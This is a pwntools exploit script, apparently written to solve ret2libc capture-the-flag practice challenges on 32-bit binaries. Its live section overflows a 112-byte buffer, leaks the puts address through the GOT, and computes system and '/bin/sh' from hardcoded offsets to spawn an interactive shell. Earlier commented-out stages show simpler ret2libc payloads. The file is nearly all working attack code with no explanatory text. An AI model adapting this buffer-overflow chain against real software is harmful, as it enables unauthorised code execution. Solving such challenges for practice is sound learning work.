from pwn import *


# # ret2libc1
# addr_system_plt = 0x08048460
# addr_bin_sh = 0x08048720
# elf = ELF("./ret2libc1")
# addr_system_plt = elf.plt["system"]
# addr_bin_sh = next(elf.search(b"/bin/sh"))

# pwn_obj = process("./ret2libc1")
# pwn_obj.sendline(
#     b"#" * 112 + 
#     p32(addr_system_plt) + 
#     b"#" * 4 + 
#     p32(addr_bin_sh))
# pwn_obj.interactive()


# # ret2libc2
# elf = ELF("./ret2libc2")
# addr_system_plt = elf.plt["system"]
# addr_gets_plt = elf.plt["gets"]
# addr_buf2 = elf.symbols["buf2"]

# pwn_obj = process("./ret2libc2")
# pwn_obj.sendline(
#     b"#" * 112 + 
#     p32(addr_gets_plt) + 
#     p32(addr_system_plt) + 
#     p32(addr_buf2) + 
#     p32(addr_buf2))
# pwn_obj.sendline(b"/bin/sh")
# pwn_obj.interactive()

# ret2libc3

# # stage 01
# elf = ELF("./ret2libc3")
# import random
# addr_puts_plt = elf.plt["puts"]
# for x in random.sample(elf.got.keys(), 8):
#     addr_x = elf.got[x]

#     pwn_obj = process("./ret2libc3")
#     pwn_obj.sendlineafter(
#         b"!?", 
#         b"#" * 112 + 
#         p32(addr_puts_plt) + 
#         b"#" * 4 + 
#         p32(addr_x))
#     print(f"[#] {x} addr: {hex(u32(pwn_obj.recv(4)))}")

# stage 02
elf = ELF("./ret2libc3")
addr_puts_plt = elf.plt["puts"]
addr_puts_got = elf.got["puts"]
addr_main_plt = elf.symbols["_start"]
puts_to_system = -176400
puts_to_binsh = 1351317

pwn_obj = process("./ret2libc3")
pwn_obj.sendlineafter(
    b"!?", 
    b"#" * 112 + 
    p32(addr_puts_plt) + 
    p32(addr_main_plt) + 
    p32(addr_puts_got))

addr_puts_memory = u32(pwn_obj.recv(4))
addr_system_memory = addr_puts_memory + puts_to_system
addr_binsh_memory = addr_puts_memory + puts_to_binsh
pwn_obj.sendlineafter(
    b"!?", 
    b"#" * 112 + 
    p32(addr_system_memory) + 
    b"#" * 4 + 
    p32(addr_binsh_memory))

pwn_obj.interactive()
